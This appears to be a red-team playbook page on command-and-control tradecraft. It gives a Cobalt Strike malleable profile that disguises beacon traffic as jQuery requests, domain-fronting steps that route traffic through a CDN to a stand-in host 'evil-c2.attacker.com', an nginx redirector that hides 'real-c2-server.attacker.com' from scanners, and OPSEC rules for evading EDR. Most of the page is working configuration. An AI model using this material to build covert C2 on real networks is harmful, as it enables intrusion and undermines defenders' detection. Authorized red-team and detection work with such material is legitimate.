# RT02: C2 Framework Tradecraft

**MITRE:** T1071.001, T1090.004 | **When:** Always - even assumed breach needs C2 infrastructure.

## Cobalt Strike - Malleable C2 Profiles

Stock Cobalt Strike signatures are detected by every EDR. Custom profiles are mandatory.

```
# Profile elements to customize:
set sleeptime "45000";       # 45s beacon interval
set jitter "30";              # +/- 30% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set dns_idle "8.8.4.4";

http-get {
  set uri "/jquery-3.3.1.min.js";
  client {
    header "Accept" "text/html,application/xhtml+xml";
    header "Referer" "https://www.google.com/";
    metadata {
      base64url;
      prepend "cookie=";
      header "Cookie";
    }
  }
  server {
    header "Content-Type" "application/javascript";
    output { mask; base64url; prepend "/*! jQuery v3.3.1 */"; }
  }
}
```

Tools: SourcePoint (malleable profile generator), Pwnage.io, Proxylogon profiles.

## Domain Fronting (T1090.004)

```
Route C2 traffic through legitimate CDN - egress appears as CDN traffic:

1. Register attacker C2 domain: evil-c2.attacker.com
2. Put CDN (Cloudflare/Fastly/Azure CDN) in front
3. Set Host header in C2 beacon to: legit-cdn-customer.azureedge.net
4. Egress: packet.dst = *.azureedge.net (CDN IP), Host: legit company domain
5. CDN routes to evil-c2.attacker.com based on routing config

# For Cobalt Strike:
set http-get.client.header "Host" "legitimate-company.azureedge.net";
```

## Redirectors (Decouple C2 from Detection)

```bash
# Nginx redirector on VPS:
# Passes only valid beacon UA patterns to C2, drops all others
cat /etc/nginx/conf.d/redirector.conf << 'EOF'
server {
  listen 443 ssl;
  location / {
    if ($http_user_agent !~ "Mozilla/5.0 (Windows NT 10.0)") {
      return 404;
    }
    proxy_pass https://real-c2-server.attacker.com;
    proxy_set_header Host $host;
  }
}
EOF
```

## OPSEC: Beacon Interval + Communication Pattern

```
- Never beacon < 30s in production engagements
- Use jitter 15-30% to prevent timing-based detection
- Rotate C2 domains every 48-72h (kill old cert, provision new)
- Use categorized domains (finance, news) - avoid newly registered domains
- TTL 60s on C2 DNS records (fast rotation without caching issues)
```
